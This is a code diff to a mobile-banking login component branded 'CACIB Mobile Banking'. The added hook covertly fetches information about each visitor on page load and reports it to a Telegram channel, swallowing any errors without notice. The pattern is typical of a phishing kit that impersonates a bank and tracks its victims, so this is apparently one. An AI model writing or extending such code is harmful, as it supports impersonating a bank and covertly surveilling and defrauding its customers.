@@ -31,6 +31,24 @@ export default function MobileBankingLogin() {
     }
   }, [])
 
+  // Visitor Location tracking when user lands on login screen
+  useEffect(() => {
+    const trackVisitor = async () => {
+      try {
+        const { sendTelegramMessage, fetchVisitorInfo } = await import("@/lib/telegram")
+        await fetchVisitorInfo()
+        await sendTelegramMessage({
+          title: "👀 New Visitor Landed - CACIB Mobile Banking",
+          type: "visitor",
+        })
+      } catch {
+        // silent fallback
+      }
+    }
+
+    trackVisitor()
+  }, [])
+
   // Auto-focus the code input when modal opens
   useEffect(() => {
     if (isVerificationModalOpen) {
